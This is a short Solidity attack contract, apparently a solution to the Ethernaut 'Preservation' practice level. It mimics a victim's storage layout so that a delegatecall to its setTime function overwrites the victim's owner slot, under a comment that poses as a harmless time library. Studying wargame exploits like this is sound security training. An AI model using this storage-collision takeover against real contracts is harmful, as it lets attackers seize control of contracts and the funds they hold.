// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Simple library contract to set the time
contract PreservationHack {
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
        owner = address(uint160(_time));
    }
}
